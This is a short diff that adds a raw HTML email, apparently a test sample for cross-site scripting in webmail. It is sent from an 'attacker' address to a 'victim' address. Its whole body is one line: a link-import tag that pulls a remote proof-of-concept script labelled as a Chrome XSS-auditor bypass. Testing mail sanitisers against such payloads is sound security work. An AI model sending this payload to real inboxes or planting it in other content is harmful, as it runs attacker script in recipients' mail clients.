@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: xss
+To: victim@189.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<link rel=import href=//body.innerht.ml/pocs/chrome-xssauditor-bypass-html-import/xss.php>
